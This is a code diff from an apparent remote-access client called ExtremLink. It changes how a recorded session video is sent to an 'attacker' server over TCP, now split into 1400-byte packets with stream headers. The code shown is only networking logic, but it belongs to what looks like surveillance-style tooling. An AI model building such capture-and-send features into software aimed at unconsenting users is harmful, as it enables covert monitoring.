@@ -10,6 +10,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
+using System.Windows.Controls;
 using System.Windows.Media.Imaging;
 
 namespace ExtremLink_Client_v2.Classes
@@ -154,14 +155,31 @@ namespace ExtremLink_Client_v2.Classes
         {
             // Input: Nothing.
             // Output: The function sends the session to the server via the attacker's session tcp socket. 
-            using (FileStream fileStream = new FileStream(this.tempVideoPath, FileMode.Open, FileAccess.Read))
+            // Define packet size (MTU-safe)
+            
+            const int packetSize = 1400; // Keeping under the MTU limit
+            int totalPackets = (int)Math.Ceiling((double)this.videoContent.Length / packetSize);
+
+            // Generate a random stream ID to identify this data stream
+            int streamId = new Random().Next(1, int.MaxValue);
+
+            // Send packets
+            // MessageBox.Show($"{totalPackets}");
+            for (int i = 0; i < totalPackets; i++)
             {
-                byte[] buffer = new byte[8192];
-                int bytesRead;
-                while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) > 0)
-                {
-                    Attacker.AttackerInstance.SessionTcpSocket.Send(buffer, 0, bytesRead, SocketFlags.None);
-                }
+                // Calculate packet bounds
+                int offset = i * packetSize;
+                int size = Math.Min(packetSize, this.videoContent.Length - offset);
+
+                // Construct packet (12 bytes of metadata + segment data)
+                byte[] packet = new byte[size + 12];
+                BitConverter.GetBytes(streamId).CopyTo(packet, 0);         // 4 bytes: Stream ID
+                BitConverter.GetBytes(totalPackets).CopyTo(packet, 4);     // 4 bytes: Total packets
+                BitConverter.GetBytes(i).CopyTo(packet, 8);                // 4 bytes: Packet index
+                Array.Copy(this.videoContent, offset, packet, 12, size);               // Segment data
+
+                // Send packet
+                Attacker.AttackerInstance.SessionTcpSocket.Send(packet);
             }
         }
         public void SendSessionToServer()
@@ -169,6 +187,7 @@ namespace ExtremLink_Client_v2.Classes
             // Input: Nothing.
             // Output: The function sends to the server the session recorded time and it's content.
             this.SendSessionRecordedTimeToServer();
+            Thread.Sleep(250);
             this.SendSessionContentToServer();
         }
     }
